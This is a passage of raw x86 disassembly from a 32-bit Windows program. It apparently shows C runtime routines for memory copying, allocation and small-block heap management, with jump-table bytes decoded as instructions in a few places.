  4248db:	and    edx,ecx
  4248dd:	mov    BYTE PTR [edi+0x3],al
  4248e0:	mov    al,BYTE PTR [esi+0x2]
  4248e3:	mov    BYTE PTR [edi+0x2],al
  4248e6:	mov    al,BYTE PTR [esi+0x1]
  4248e9:	shr    ecx,0x2
  4248ec:	mov    BYTE PTR [edi+0x1],al
  4248ef:	sub    esi,0x3
  4248f2:	sub    edi,0x3
  4248f5:	cmp    ecx,0x8
  4248f8:	jb     0x424854
  4248fe:	std    
  4248ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424901:	cld    
  424902:	jmp    DWORD PTR [edx*4+0x424978]
  424909:	lea    ecx,[ecx+0x0]
  42490c:	sub    al,0x49
  42490e:	inc    edx
  42490f:	add    BYTE PTR [ecx+ecx*2],dh
  424912:	inc    edx
  424913:	add    BYTE PTR [ecx+ecx*2],bh
  424916:	inc    edx
  424917:	add    BYTE PTR [ecx+ecx*2+0x42],al
  42491b:	add    BYTE PTR [ecx+ecx*2+0x42],cl
  42491f:	add    BYTE PTR [ecx+ecx*2+0x42],dl
  424923:	add    BYTE PTR [ecx+ecx*2+0x42],bl
  424927:	add    BYTE PTR [edi+0x49],ch
  42492a:	inc    edx
  42492b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424931:	inc    esp
  424932:	(bad)  
  424933:	sbb    al,0x8b
  424935:	inc    esp
  424936:	mov    ds,WORD PTR [eax]
  424938:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42493c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424940:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424944:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424948:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42494c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424950:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424954:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424958:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42495c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424960:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424964:	lea    eax,[ecx*4+0x0]
  42496b:	add    esi,eax
  42496d:	add    edi,eax
  42496f:	jmp    DWORD PTR [edx*4+0x424978]
  424976:	mov    edi,edi
  424978:	mov    BYTE PTR [ecx+0x42],cl
  42497b:	add    BYTE PTR [eax-0x5fffbdb7],dl
  424981:	dec    ecx
  424982:	inc    edx
  424983:	add    BYTE PTR [ecx+ecx*2+0x458b0042],dh
  42498a:	or     BYTE PTR [esi+0x5f],bl
  42498d:	leave  
  42498e:	ret    
  42498f:	nop
  424990:	mov    al,BYTE PTR [esi+0x3]
  424993:	mov    BYTE PTR [edi+0x3],al
  424996:	mov    eax,DWORD PTR [ebp+0x8]
  424999:	pop    esi
  42499a:	pop    edi
  42499b:	leave  
  42499c:	ret    
  42499d:	lea    ecx,[ecx+0x0]
  4249a0:	mov    al,BYTE PTR [esi+0x3]
  4249a3:	mov    BYTE PTR [edi+0x3],al
  4249a6:	mov    al,BYTE PTR [esi+0x2]
  4249a9:	mov    BYTE PTR [edi+0x2],al
  4249ac:	mov    eax,DWORD PTR [ebp+0x8]
  4249af:	pop    esi
  4249b0:	pop    edi
  4249b1:	leave  
  4249b2:	ret    
  4249b3:	nop
  4249b4:	mov    al,BYTE PTR [esi+0x3]
  4249b7:	mov    BYTE PTR [edi+0x3],al
  4249ba:	mov    al,BYTE PTR [esi+0x2]
  4249bd:	mov    BYTE PTR [edi+0x2],al
  4249c0:	mov    al,BYTE PTR [esi+0x1]
  4249c3:	mov    BYTE PTR [edi+0x1],al
  4249c6:	mov    eax,DWORD PTR [ebp+0x8]
  4249c9:	pop    esi
  4249ca:	pop    edi
  4249cb:	leave  
  4249cc:	ret    
  4249cd:	push   DWORD PTR [esp+0x4]
  4249d1:	call   DWORD PTR ds:0x4280e8
  4249d7:	xor    eax,eax
  4249d9:	inc    eax
  4249da:	ret    0x8
  4249dd:	push   0x10
  4249df:	push   0x428610
  4249e4:	call   0x423950
  4249e9:	mov    eax,ds:0x465028
  4249ee:	test   eax,eax
  4249f0:	jne    0x424a29
  4249f2:	cmp    DWORD PTR ds:0x464d64,0x1
  4249f9:	je     0x424a1f
  4249fb:	push   0x4285fc
  424a00:	call   DWORD PTR ds:0x428044
  424a06:	test   eax,eax
  424a08:	je     0x424a1f
  424a0a:	push   0x4285d4
  424a0f:	push   eax
  424a10:	call   DWORD PTR ds:0x42804c
  424a16:	mov    ds:0x465028,eax
  424a1b:	test   eax,eax
  424a1d:	jne    0x424a29
  424a1f:	mov    eax,0x4249cd
  424a24:	mov    ds:0x465028,eax
  424a29:	and    DWORD PTR [ebp-0x4],0x0
  424a2d:	push   DWORD PTR [ebp+0xc]
  424a30:	push   DWORD PTR [ebp+0x8]
  424a33:	call   eax
  424a35:	mov    DWORD PTR [ebp-0x1c],eax
  424a38:	jmp    0x424a5e
  424a3a:	mov    eax,DWORD PTR [ebp-0x14]
  424a3d:	mov    eax,DWORD PTR [eax]
  424a3f:	mov    eax,DWORD PTR [eax]
  424a41:	mov    DWORD PTR [ebp-0x20],eax
  424a44:	xor    eax,eax
  424a46:	inc    eax
  424a47:	ret    
  424a48:	mov    esp,DWORD PTR [ebp-0x18]
  424a4b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424a52:	jne    0x424a5c
  424a54:	push   0x8
  424a56:	call   DWORD PTR ds:0x4280a8
  424a5c:	xor    eax,eax
  424a5e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a62:	call   0x42398b
  424a67:	ret    
  424a68:	push   0x10
  424a6a:	push   0x428620
  424a6f:	call   0x423950
  424a74:	mov    esi,DWORD PTR [ebp+0x8]
  424a77:	imul   esi,DWORD PTR [ebp+0xc]
  424a7b:	mov    DWORD PTR [ebp-0x1c],esi
  424a7e:	test   esi,esi
  424a80:	jne    0x424a83
  424a82:	inc    esi
  424a83:	xor    edi,edi
  424a85:	mov    DWORD PTR [ebp-0x20],edi
  424a88:	cmp    esi,0xffffffe0
  424a8b:	ja     0x424af2
  424a8d:	cmp    DWORD PTR ds:0x4653e4,0x3
  424a94:	jne    0x424add
  424a96:	add    esi,0xf
  424a99:	and    esi,0xfffffff0
  424a9c:	mov    DWORD PTR [ebp+0xc],esi
  424a9f:	mov    ebx,DWORD PTR [ebp-0x1c]
  424aa2:	cmp    ebx,DWORD PTR ds:0x4651a4
  424aa8:	ja     0x424add
  424aaa:	push   0x4
  424aac:	call   0x423b0f
  424ab1:	pop    ecx
  424ab2:	and    DWORD PTR [ebp-0x4],edi
  424ab5:	push   ebx
  424ab6:	call   0x425511
  424abb:	pop    ecx
  424abc:	mov    DWORD PTR [ebp-0x20],eax
  424abf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424ac3:	call   0x424b12
  424ac8:	mov    edi,DWORD PTR [ebp-0x20]
  424acb:	test   edi,edi
  424acd:	je     0x424ae1
  424acf:	push   DWORD PTR [ebp-0x1c]
  424ad2:	push   0x0
  424ad4:	push   edi
  424ad5:	call   0x426250
  424ada:	add    esp,0xc
  424add:	test   edi,edi
  424adf:	jne    0x424b1b
  424ae1:	push   esi
  424ae2:	push   0x8
  424ae4:	push   DWORD PTR ds:0x4653e0
  424aea:	call   DWORD PTR ds:0x4280e4
  424af0:	mov    edi,eax
  424af2:	test   edi,edi
  424af4:	jne    0x424b1b
  424af6:	cmp    DWORD PTR ds:0x465068,edi
  424afc:	je     0x424b1b
  424afe:	push   esi
  424aff:	call   0x426232
  424b04:	pop    ecx
  424b05:	test   eax,eax
  424b07:	jne    0x424a83
  424b0d:	jmp    0x424b1d
  424b0f:	mov    esi,DWORD PTR [ebp+0xc]
  424b12:	push   0x4
  424b14:	call   0x423a7b
  424b19:	pop    ecx
  424b1a:	ret    
  424b1b:	mov    eax,edi
  424b1d:	call   0x42398b
  424b22:	ret    
  424b23:	push   esi
  424b24:	mov    esi,DWORD PTR [esp+0x8]
  424b28:	mov    eax,DWORD PTR [esi+0x3c]
  424b2b:	push   edi
  424b2c:	xor    edi,edi
  424b2e:	cmp    eax,DWORD PTR ds:0x465074
  424b34:	je     0x424b99
  424b36:	cmp    eax,edi
  424b38:	je     0x424b99
  424b3a:	mov    eax,DWORD PTR [esi+0x2c]
  424b3d:	cmp    DWORD PTR [eax],edi
  424b3f:	jne    0x424b99
  424b41:	mov    eax,DWORD PTR [esi+0x34]
  424b44:	cmp    eax,edi
  424b46:	je     0x424b64
  424b48:	cmp    DWORD PTR [eax],edi
  424b4a:	jne    0x424b64
  424b4c:	cmp    eax,DWORD PTR ds:0x465190
  424b52:	je     0x424b64
  424b54:	push   eax
  424b55:	call   0x42455a
  424b5a:	push   DWORD PTR [esi+0x3c]
  424b5d:	call   0x42649f
  424b62:	pop    ecx
  424b63:	pop    ecx
  424b64:	mov    eax,DWORD PTR [esi+0x30]
  424b67:	cmp    eax,edi
  424b69:	je     0x424b87
  424b6b:	cmp    DWORD PTR [eax],edi
  424b6d:	jne    0x424b87
  424b6f:	cmp    eax,DWORD PTR ds:0x465194
  424b75:	je     0x424b87
  424b77:	push   eax
  424b78:	call   0x42455a
  424b7d:	push   DWORD PTR [esi+0x3c]
  424b80:	call   0x426440
  424b85:	pop    ecx
  424b86:	pop    ecx
  424b87:	push   DWORD PTR [esi+0x2c]
  424b8a:	call   0x42455a
  424b8f:	push   DWORD PTR [esi+0x3c]
  424b92:	call   0x42455a
  424b97:	pop    ecx
  424b98:	pop    ecx
  424b99:	mov    eax,DWORD PTR [esi+0x40]
  424b9c:	cmp    eax,DWORD PTR ds:0x46518c
  424ba2:	je     0x424bbc
  424ba4:	cmp    eax,edi
  424ba6:	je     0x424bbc
  424ba8:	cmp    DWORD PTR [eax],edi
  424baa:	jne    0x424bbc
  424bac:	push   eax
  424bad:	call   0x42455a
  424bb2:	push   DWORD PTR [esi+0x44]
  424bb5:	call   0x42455a
  424bba:	pop    ecx
  424bbb:	pop    ecx
  424bbc:	mov    eax,DWORD PTR [esi+0x50]
  424bbf:	cmp    eax,DWORD PTR ds:0x465070
  424bc5:	je     0x424be3
  424bc7:	cmp    eax,edi
  424bc9:	je     0x424be3
  424bcb:	cmp    DWORD PTR [eax+0xb4],edi
  424bd1:	jne    0x424be3
  424bd3:	push   eax
  424bd4:	call   0x4262b0
  424bd9:	push   DWORD PTR [esi+0x50]
  424bdc:	call   0x42455a
  424be1:	pop    ecx
  424be2:	pop    ecx
  424be3:	push   esi
  424be4:	call   0x42455a
  424be9:	pop    ecx
  424bea:	pop    edi
  424beb:	pop    esi
  424bec:	ret    
  424bed:	push   esi
  424bee:	call   0x423803
  424bf3:	mov    esi,eax
  424bf5:	mov    eax,DWORD PTR [esi+0x64]
  424bf8:	cmp    eax,DWORD PTR ds:0x46481c
  424bfe:	je     0x424caa
  424c04:	test   eax,eax
  424c06:	je     0x424c37
  424c08:	mov    ecx,DWORD PTR [eax+0x2c]
  424c0b:	dec    DWORD PTR [eax]
  424c0d:	test   ecx,ecx
  424c0f:	je     0x424c13
  424c11:	dec    DWORD PTR [ecx]
  424c13:	mov    ecx,DWORD PTR [eax+0x34]
  424c16:	test   ecx,ecx
  424c18:	je     0x424c1c
  424c1a:	dec    DWORD PTR [ecx]
  424c1c:	mov    ecx,DWORD PTR [eax+0x30]
  424c1f:	test   ecx,ecx
  424c21:	je     0x424c25
  424c23:	dec    DWORD PTR [ecx]
  424c25:	mov    ecx,DWORD PTR [eax+0x40]
  424c28:	test   ecx,ecx
  424c2a:	je     0x424c2e
  424c2c:	dec    DWORD PTR [ecx]
  424c2e:	mov    ecx,DWORD PTR [eax+0x4c]
  424c31:	dec    DWORD PTR [ecx+0xb4]
  424c37:	mov    ecx,DWORD PTR ds:0x46481c
  424c3d:	mov    DWORD PTR [esi+0x64],ecx
  424c40:	mov    ecx,DWORD PTR ds:0x46481c
  424c46:	inc    DWORD PTR [ecx]
  424c48:	mov    ecx,DWORD PTR ds:0x46481c
  424c4e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424c51:	test   ecx,ecx
  424c53:	je     0x424c57
  424c55:	inc    DWORD PTR [ecx]
  424c57:	mov    ecx,DWORD PTR ds:0x46481c
  424c5d:	mov    ecx,DWORD PTR [ecx+0x34]
  424c60:	test   ecx,ecx
  424c62:	je     0x424c66
  424c64:	inc    DWORD PTR [ecx]
  424c66:	mov    ecx,DWORD PTR ds:0x46481c
  424c6c:	mov    ecx,DWORD PTR [ecx+0x30]
  424c6f:	test   ecx,ecx
  424c71:	je     0x424c75
  424c73:	inc    DWORD PTR [ecx]
  424c75:	mov    ecx,DWORD PTR ds:0x46481c
  424c7b:	mov    ecx,DWORD PTR [ecx+0x40]
  424c7e:	test   ecx,ecx
  424c80:	je     0x424c84
  424c82:	inc    DWORD PTR [ecx]
  424c84:	mov    ecx,DWORD PTR ds:0x46481c
  424c8a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424c8d:	inc    DWORD PTR [ecx+0xb4]
  424c93:	test   eax,eax
  424c95:	je     0x424caa
  424c97:	cmp    DWORD PTR [eax],0x0
  424c9a:	jne    0x424caa
  424c9c:	cmp    eax,0x4647c8
  424ca1:	je     0x424caa
  424ca3:	push   eax
  424ca4:	call   0x424b23
  424ca9:	pop    ecx
  424caa:	mov    eax,DWORD PTR [esi+0x64]
  424cad:	pop    esi
  424cae:	ret    
  424caf:	push   0xc
  424cb1:	push   0x4287b0
  424cb6:	call   0x423950
  424cbb:	push   0xc
  424cbd:	call   0x423b0f
  424cc2:	pop    ecx
  424cc3:	and    DWORD PTR [ebp-0x4],0x0
  424cc7:	call   0x424bed
  424ccc:	mov    DWORD PTR [ebp-0x1c],eax
  424ccf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424cd3:	call   0x424ce1
  424cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  424cdb:	call   0x42398b
  424ce0:	ret    
  424ce1:	push   0xc
  424ce3:	call   0x423a7b
  424ce8:	pop    ecx
  424ce9:	ret    
  424cea:	push   0x140
  424cef:	push   0x0
  424cf1:	push   DWORD PTR ds:0x4653e0
  424cf7:	call   DWORD PTR ds:0x4280e4
  424cfd:	test   eax,eax
  424cff:	mov    ds:0x4651a0,eax
  424d04:	jne    0x424d07
  424d06:	ret    
  424d07:	mov    ecx,DWORD PTR [esp+0x4]
  424d0b:	and    DWORD PTR ds:0x465198,0x0
  424d12:	and    DWORD PTR ds:0x46519c,0x0
  424d19:	mov    ds:0x4651a8,eax
  424d1e:	xor    eax,eax
  424d20:	mov    DWORD PTR ds:0x4651a4,ecx
  424d26:	mov    DWORD PTR ds:0x4651ac,0x10
  424d30:	inc    eax
  424d31:	ret    
  424d32:	mov    eax,ds:0x46519c
  424d37:	lea    ecx,[eax+eax*4]
  424d3a:	mov    eax,ds:0x4651a0
  424d3f:	lea    ecx,[eax+ecx*4]
  424d42:	jmp    0x424d56
  424d44:	mov    edx,DWORD PTR [esp+0x4]
  424d48:	sub    edx,DWORD PTR [eax+0xc]
  424d4b:	cmp    edx,0x100000
  424d51:	jb     0x424d5c
  424d53:	add    eax,0x14
  424d56:	cmp    eax,ecx
  424d58:	jb     0x424d44
  424d5a:	xor    eax,eax
  424d5c:	ret    
  424d5d:	push   ebp
  424d5e:	mov    ebp,esp
  424d60:	sub    esp,0x10
  424d63:	mov    ecx,DWORD PTR [ebp+0x8]
  424d66:	mov    eax,DWORD PTR [ecx+0x10]
  424d69:	push   esi
  424d6a:	mov    esi,DWORD PTR [ebp+0xc]
  424d6d:	push   edi
  424d6e:	mov    edi,esi
  424d70:	sub    edi,DWORD PTR [ecx+0xc]
  424d73:	add    esi,0xfffffffc
  424d76:	shr    edi,0xf
  424d79:	mov    ecx,edi
  424d7b:	imul   ecx,ecx,0x204
  424d81:	lea    ecx,[ecx+eax*1+0x144]
  424d88:	mov    DWORD PTR [ebp-0x10],ecx
  424d8b:	mov    ecx,DWORD PTR [esi]
  424d8d:	dec    ecx
  424d8e:	test   cl,0x1
  424d91:	mov    DWORD PTR [ebp-0x4],ecx
  424d94:	jne    0x425071
  424d9a:	push   ebx
  424d9b:	lea    ebx,[ecx+esi*1]
  424d9e:	mov    edx,DWORD PTR [ebx]
  424da0:	mov    DWORD PTR [ebp-0xc],edx
  424da3:	mov    edx,DWORD PTR [esi-0x4]
  424da6:	mov    DWORD PTR [ebp-0x8],edx
  424da9:	mov    edx,DWORD PTR [ebp-0xc]
  424dac:	test   dl,0x1
  424daf:	mov    DWORD PTR [ebp+0xc],ebx
  424db2:	jne    0x424e28
  424db4:	sar    edx,0x4
  424db7:	dec    edx
  424db8:	cmp    edx,0x3f
  424dbb:	jbe    0x424dc0
  424dbd:	push   0x3f
  424dbf:	pop    edx
  424dc0:	mov    ecx,DWORD PTR [ebx+0x4]
  424dc3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424dc6:	jne    0x424e0a
  424dc8:	cmp    edx,0x20
  424dcb:	mov    ebx,0x80000000
  424dd0:	jae    0x424deb
  424dd2:	mov    ecx,edx
  424dd4:	shr    ebx,cl
  424dd6:	lea    ecx,[edx+eax*1+0x4]
  424dda:	not    ebx
  424ddc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424de0:	dec    BYTE PTR [ecx]
  424de2:	jne    0x424e07
  424de4:	mov    ecx,DWORD PTR [ebp+0x8]
  424de7:	and    DWORD PTR [ecx],ebx
  424de9:	jmp    0x424e07
  424deb:	lea    ecx,[edx-0x20]
  424dee:	shr    ebx,cl
  424df0:	lea    ecx,[edx+eax*1+0x4]
  424df4:	not    ebx
  424df6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424dfd:	dec    BYTE PTR [ecx]
  424dff:	jne    0x424e07
  424e01:	mov    ecx,DWORD PTR [ebp+0x8]
  424e04:	and    DWORD PTR [ecx+0x4],ebx
  424e07:	mov    ebx,DWORD PTR [ebp+0xc]
  424e0a:	mov    edx,DWORD PTR [ebx+0x8]
  424e0d:	mov    ebx,DWORD PTR [ebx+0x4]
  424e10:	mov    ecx,DWORD PTR [ebp-0x4]
  424e13:	add    ecx,DWORD PTR [ebp-0xc]
  424e16:	mov    DWORD PTR [edx+0x4],ebx
  424e19:	mov    edx,DWORD PTR [ebp+0xc]
  424e1c:	mov    ebx,DWORD PTR [edx+0x4]
  424e1f:	mov    edx,DWORD PTR [edx+0x8]
  424e22:	mov    DWORD PTR [ebx+0x8],edx
  424e25:	mov    DWORD PTR [ebp-0x4],ecx
  424e28:	mov    edx,ecx
  424e2a:	sar    edx,0x4
  424e2d:	dec    edx
  424e2e:	cmp    edx,0x3f
  424e31:	jbe    0x424e36
  424e33:	push   0x3f
  424e35:	pop    edx
  424e36:	mov    ebx,DWORD PTR [ebp-0x8]
  424e39:	and    ebx,0x1
  424e3c:	mov    DWORD PTR [ebp-0xc],ebx
  424e3f:	jne    0x424ed4
  424e45:	sub    esi,DWORD PTR [ebp-0x8]
  424e48:	mov    ebx,DWORD PTR [ebp-0x8]
  424e4b:	sar    ebx,0x4
  424e4e:	push   0x3f
  424e50:	mov    DWORD PTR [ebp+0xc],esi
  424e53:	dec    ebx
  424e54:	pop    esi
  424e55:	cmp    ebx,esi
  424e57:	jbe    0x424e5b
  424e59:	mov    ebx,esi
  424e5b:	add    ecx,DWORD PTR [ebp-0x8]
  424e5e:	mov    edx,ecx
  424e60:	sar    edx,0x4
  424e63:	dec    edx
  424e64:	cmp    edx,esi
  424e66:	mov    DWORD PTR [ebp-0x4],ecx
  424e69:	jbe    0x424e6d
  424e6b:	mov    edx,esi
  424e6d:	cmp    ebx,edx
  424e6f:	je     0x424ecf
  424e71:	mov    ecx,DWORD PTR [ebp+0xc]
  424e74:	mov    esi,DWORD PTR [ecx+0x4]
  424e77:	cmp    esi,DWORD PTR [ecx+0x8]
  424e7a:	jne    0x424eb7
  424e7c:	cmp    ebx,0x20
  424e7f:	mov    esi,0x80000000
  424e84:	jae    0x424e9d
  424e86:	mov    ecx,ebx
  424e88:	shr    esi,cl
  424e8a:	not    esi
  424e8c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424e90:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e94:	jne    0x424eb7
  424e96:	mov    ecx,DWORD PTR [ebp+0x8]
  424e99:	and    DWORD PTR [ecx],esi
  424e9b:	jmp    0x424eb7
  424e9d:	lea    ecx,[ebx-0x20]
  424ea0:	shr    esi,cl
  424ea2:	not    esi
  424ea4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424eab:	dec    BYTE PTR [ebx+eax*1+0x4]
  424eaf:	jne    0x424eb7
  424eb1:	mov    ecx,DWORD PTR [ebp+0x8]
  424eb4:	and    DWORD PTR [ecx+0x4],esi
  424eb7:	mov    ecx,DWORD PTR [ebp+0xc]
  424eba:	mov    esi,DWORD PTR [ecx+0x8]
  424ebd:	mov    ecx,DWORD PTR [ecx+0x4]
  424ec0:	mov    DWORD PTR [esi+0x4],ecx
  424ec3:	mov    ecx,DWORD PTR [ebp+0xc]
  424ec6:	mov    esi,DWORD PTR [ecx+0x4]
  424ec9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ecc:	mov    DWORD PTR [esi+0x8],ecx
  424ecf:	mov    esi,DWORD PTR [ebp+0xc]
  424ed2:	jmp    0x424ed7
  424ed4:	mov    ebx,DWORD PTR [ebp+0x8]
  424ed7:	cmp    DWORD PTR [ebp-0xc],0x0
  424edb:	jne    0x424ee5
  424edd:	cmp    ebx,edx
  424edf:	je     0x424f65
  424ee5:	mov    ecx,DWORD PTR [ebp-0x10]
  424ee8:	lea    ecx,[ecx+edx*8]
  424eeb:	mov    ebx,DWORD PTR [ecx+0x4]
  424eee:	mov    DWORD PTR [esi+0x8],ecx
  424ef1:	mov    DWORD PTR [esi+0x4],ebx
  424ef4:	mov    DWORD PTR [ecx+0x4],esi
  424ef7:	mov    ecx,DWORD PTR [esi+0x4]
  424efa:	mov    DWORD PTR [ecx+0x8],esi
  424efd:	mov    ecx,DWORD PTR [esi+0x4]
  424f00:	cmp    ecx,DWORD PTR [esi+0x8]
  424f03:	jne    0x424f65
  424f05:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424f09:	mov    BYTE PTR [ebp+0xf],cl
  424f0c:	inc    cl
  424f0e:	cmp    edx,0x20
  424f11:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424f15:	jae    0x424f3c
  424f17:	cmp    BYTE PTR [ebp+0xf],0x0
  424f1b:	jne    0x424f2b
  424f1d:	mov    ecx,edx
  424f1f:	mov    ebx,0x80000000
  424f24:	shr    ebx,cl
  424f26:	mov    ecx,DWORD PTR [ebp+0x8]
  424f29:	or     DWORD PTR [ecx],ebx
  424f2b:	mov    ebx,0x80000000
  424f30:	mov    ecx,edx
  424f32:	shr    ebx,cl
  424f34:	lea    eax,[eax+edi*4+0x44]
  424f38:	or     DWORD PTR [eax],ebx
  424f3a:	jmp    0x424f65
  424f3c:	cmp    BYTE PTR [ebp+0xf],0x0
  424f40:	jne    0x424f52
  424f42:	lea    ecx,[edx-0x20]
  424f45:	mov    ebx,0x80000000
  424f4a:	shr    ebx,cl
  424f4c:	mov    ecx,DWORD PTR [ebp+0x8]
  424f4f:	or     DWORD PTR [ecx+0x4],ebx
  424f52:	lea    ecx,[edx-0x20]
  424f55:	mov    edx,0x80000000
  424f5a:	shr    edx,cl
  424f5c:	lea    eax,[eax+edi*4+0xc4]
  424f63:	or     DWORD PTR [eax],edx
  424f65:	mov    eax,DWORD PTR [ebp-0x4]
  424f68:	mov    DWORD PTR [esi],eax
  424f6a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424f6e:	mov    eax,DWORD PTR [ebp-0x10]
  424f71:	dec    DWORD PTR [eax]
  424f73:	jne    0x425070
  424f79:	mov    eax,ds:0x465198
  424f7e:	test   eax,eax
  424f80:	je     0x425062
  424f86:	mov    ecx,DWORD PTR ds:0x4651b0
  424f8c:	mov    esi,DWORD PTR ds:0x4280c4
  424f92:	push   0x4000
  424f97:	shl    ecx,0xf
  424f9a:	add    ecx,DWORD PTR [eax+0xc]
  424f9d:	mov    ebx,0x8000
  424fa2:	push   ebx
  424fa3:	push   ecx
  424fa4:	call   esi
  424fa6:	mov    ecx,DWORD PTR ds:0x4651b0
  424fac:	mov    eax,ds:0x465198
  424fb1:	mov    edx,0x80000000
  424fb6:	shr    edx,cl
  424fb8:	or     DWORD PTR [eax+0x8],edx
  424fbb:	mov    eax,ds:0x465198
  424fc0:	mov    eax,DWORD PTR [eax+0x10]
  424fc3:	mov    ecx,DWORD PTR ds:0x4651b0
  424fc9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424fd1:	mov    eax,ds:0x465198
  424fd6:	mov    eax,DWORD PTR [eax+0x10]
  424fd9:	dec    BYTE PTR [eax+0x43]
  424fdc:	mov    eax,ds:0x465198
  424fe1:	mov    ecx,DWORD PTR [eax+0x10]
  424fe4:	cmp    BYTE PTR [ecx+0x43],0x0
  424fe8:	jne    0x424ff3
  424fea:	and    DWORD PTR [eax+0x4],0xfffffffe
  424fee:	mov    eax,ds:0x465198
  424ff3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424ff7:	jne    0x425062
  424ff9:	push   ebx
  424ffa:	push   0x0
  424ffc:	push   DWORD PTR [eax+0xc]
  424fff:	call   esi
  425001:	mov    eax,ds:0x465198
  425006:	push   DWORD PTR [eax+0x10]
  425009:	push   0x0
  42500b:	push   DWORD PTR ds:0x4653e0
  425011:	call   DWORD PTR ds:0x4280c8
  425017:	mov    eax,ds:0x46519c
  42501c:	mov    edx,DWORD PTR ds:0x4651a0
  425022:	lea    eax,[eax+eax*4]
  425025:	shl    eax,0x2
  425028:	mov    ecx,eax
  42502a:	mov    eax,ds:0x465198
  42502f:	sub    ecx,eax
  425031:	lea    ecx,[ecx+edx*1-0x14]
  425035:	push   ecx
  425036:	lea    ecx,[eax+0x14]
  425039:	push   ecx
  42503a:	push   eax
  42503b:	call   0x426890
  425040:	mov    eax,DWORD PTR [ebp+0x8]
  425043:	add    esp,0xc
  425046:	dec    DWORD PTR ds:0x46519c
  42504c:	cmp    eax,DWORD PTR ds:0x465198
  425052:	jbe    0x425058
  425054:	sub    DWORD PTR [ebp+0x8],0x14
  425058:	mov    eax,ds:0x4651a0
  42505d:	mov    ds:0x4651a8,eax
  425062:	mov    eax,DWORD PTR [ebp+0x8]
  425065:	mov    ds:0x465198,eax
  42506a:	mov    DWORD PTR ds:0x4651b0,edi
  425070:	pop    ebx
  425071:	pop    edi
  425072:	pop    esi
  425073:	leave  
  425074:	ret    
  425075:	mov    eax,ds:0x46519c
  42507a:	mov    ecx,DWORD PTR ds:0x4651ac
  425080:	push   edi
  425081:	xor    edi,edi
  425083:	cmp    eax,ecx
  425085:	jne    0x4250bb
  425087:	lea    eax,[ecx+ecx*4+0x50]
  42508b:	shl    eax,0x2
  42508e:	push   eax
  42508f:	push   DWORD PTR ds:0x4651a0
  425095:	push   edi
  425096:	push   DWORD PTR ds:0x4653e0
  42509c:	call   DWORD PTR ds:0x4280f0
  4250a2:	cmp    eax,edi
  4250a4:	jne    0x4250aa
  4250a6:	xor    eax,eax
  4250a8:	pop    edi
  4250a9:	ret    
  4250aa:	add    DWORD PTR ds:0x4651ac,0x10
  4250b1:	mov    ds:0x4651a0,eax
  4250b6:	mov    eax,ds:0x46519c
  4250bb:	mov    ecx,DWORD PTR ds:0x4651a0
  4250c1:	push   esi
  4250c2:	push   0x41c4
  4250c7:	push   0x8
  4250c9:	push   DWORD PTR ds:0x4653e0
  4250cf:	lea    eax,[eax+eax*4]
  4250d2:	lea    esi,[ecx+eax*4]
  4250d5:	call   DWORD PTR ds:0x4280e4
  4250db:	cmp    eax,edi
  4250dd:	mov    DWORD PTR [esi+0x10],eax
  4250e0:	jne    0x4250e6
  4250e2:	xor    eax,eax
  4250e4:	jmp    0x425129
  4250e6:	push   0x4
  4250e8:	push   0x2000
  4250ed:	push   0x100000
  4250f2:	push   edi
  4250f3:	call   DWORD PTR ds:0x4280ec
  4250f9:	cmp    eax,edi
  4250fb:	mov    DWORD PTR [esi+0xc],eax
  4250fe:	jne    0x425112
  425100:	push   DWORD PTR [esi+0x10]
  425103:	push   edi
  425104:	push   DWORD PTR ds:0x4653e0
  42510a:	call   DWORD PTR ds:0x4280c8
  425110:	jmp    0x4250e2
  425112:	or     DWORD PTR [esi+0x8],0xffffffff
  425116:	mov    DWORD PTR [esi],edi
  425118:	mov    DWORD PTR [esi+0x4],edi
  42511b:	inc    DWORD PTR ds:0x46519c
  425121:	mov    eax,DWORD PTR [esi+0x10]
  425124:	or     DWORD PTR [eax],0xffffffff
  425127:	mov    eax,esi
  425129:	pop    esi
  42512a:	pop    edi
  42512b:	ret    
  42512c:	push   ebp
  42512d:	mov    ebp,esp
  42512f:	push   ecx
  425130:	push   ecx
  425131:	mov    ecx,DWORD PTR [ebp+0x8]
  425134:	mov    eax,DWORD PTR [ecx+0x8]
  425137:	push   ebx
  425138:	push   esi
  425139:	mov    esi,DWORD PTR [ecx+0x10]
  42513c:	push   edi
  42513d:	xor    ebx,ebx
  42513f:	jmp    0x425144
  425141:	shl    eax,1
  425143:	inc    ebx
  425144:	test   eax,eax
  425146:	jge    0x425141
  425148:	mov    eax,ebx
  42514a:	imul   eax,eax,0x204
  425150:	lea    eax,[eax+esi*1+0x144]
  425157:	push   0x3f
  425159:	mov    DWORD PTR [ebp-0x8],eax
  42515c:	pop    edx
  42515d:	mov    DWORD PTR [eax+0x8],eax
  425160:	mov    DWORD PTR [eax+0x4],eax
  425163:	add    eax,0x8
  425166:	dec    edx
  425167:	jne    0x42515d
  425169:	push   0x4
